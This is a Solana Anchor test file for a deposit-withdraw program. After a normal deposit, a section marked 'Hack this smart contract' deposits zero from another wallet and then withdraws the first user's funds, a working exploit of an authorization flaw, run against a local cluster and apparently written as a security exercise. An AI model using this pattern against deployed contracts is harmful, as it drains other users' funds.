import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { DepositWithdraw } from "../target/types/deposit_withdraw";

describe("deposit-withdraw", () => {
  // Configure the client to use the local cluster.
  const provider = anchor.AnchorProvider.env();
  const connection = provider.connection;
  const wallet = provider.wallet as anchor.Wallet;
  anchor.setProvider(provider);

  const program = anchor.workspace.DepositWithdraw as Program<DepositWithdraw>;

  const authority = new anchor.web3.Keypair();
  const amount = 1_000_000;

  before(async() => {
    const transferAmount = 1 * anchor.web3.LAMPORTS_PER_SOL;
    const transferTx = new anchor.web3.Transaction().add(
        anchor.web3.SystemProgram.transfer({
            fromPubkey: provider.wallet.publicKey,
            toPubkey: authority.publicKey,
            lamports: transferAmount,
        })
    );

    await provider.sendAndConfirm(
        transferTx,
    );
  })

  it("Deposit", async () => {

    const transaction = await program.methods.deposit(new anchor.BN(amount))
        .accounts({depositor: authority.publicKey})
        .transaction()

    const transactionSignature = await anchor.web3.sendAndConfirmTransaction(
        connection,
        transaction,
        [authority],
        { commitment: "confirmed"}
    );

    console.log("Transaction Signature: ", transactionSignature);


    // Hack this smart contract

    const exploitTransaction = await program.methods.deposit(new anchor.BN(0))
    .accounts({depositor: wallet.publicKey})
    .transaction();

    const exploitSignature = await anchor.web3.sendAndConfirmTransaction(
        connection,
        exploitTransaction,
        [wallet.payer],
        { commitment: "confirmed"}
    );

    console.log("Transaction Signature: ", exploitSignature);

    const withDrawInstruction = await program.methods.withdraw(new anchor.BN(amount))
        .accounts({authority: wallet.publicKey})
        .instruction();

    const withdrawExploitTx = new anchor.web3.Transaction().add(withDrawInstruction);

    const exploitWithdraw = await anchor.web3.sendAndConfirmTransaction(
        connection,
        withdrawExploitTx,
        [wallet.payer],
        { commitment: "confirmed"}
    );

    console.log("Transaction Signature: ", exploitWithdraw);
  });
});
